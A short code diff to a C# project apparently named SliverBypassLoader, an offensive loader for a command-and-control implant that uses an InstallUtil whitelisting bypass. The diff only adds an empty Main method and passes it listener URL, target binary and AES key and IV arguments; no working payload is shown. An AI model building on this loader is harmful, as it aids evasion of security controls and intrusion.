@@ -15,8 +15,12 @@ using System.Runtime.Remoting.Contexts;
 namespace SliverBypassLoader
 {
     class altbypass
-    { 
-    
+    {
+
+        public static void Main(string[] args) 
+        { 
+        
+        }
     }
 
     // InstallUtill uninstall bypass
@@ -57,6 +61,7 @@ namespace SliverBypassLoader
             }
 
             string[] args = new string[] { listenerUrl, compressAlgorithm, targetBinary, aesKey, aesIv };
+            altbypass.Main(args);
         }
     }
 }
